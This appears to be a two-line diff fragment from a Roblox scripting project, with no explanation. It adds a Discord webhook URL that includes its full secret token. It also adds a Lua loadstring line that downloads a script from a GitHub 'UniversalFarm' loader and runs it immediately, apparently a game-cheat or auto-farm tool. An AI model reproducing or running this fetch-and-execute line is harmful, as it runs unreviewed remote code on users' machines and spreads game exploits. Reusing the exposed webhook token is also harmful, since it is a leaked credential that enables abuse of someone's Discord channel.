@@ -1,0 +1,3 @@
+https://discord.com/api/webhooks/1335042793458106388/H-DCaj5Yoqo-NRWdwx-jIEXxQmHK8UVv7apvVd8ZQkGhXDWUClMkGI_oi-Hrkvb3ksF2
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/main/Loader/Regular"))()
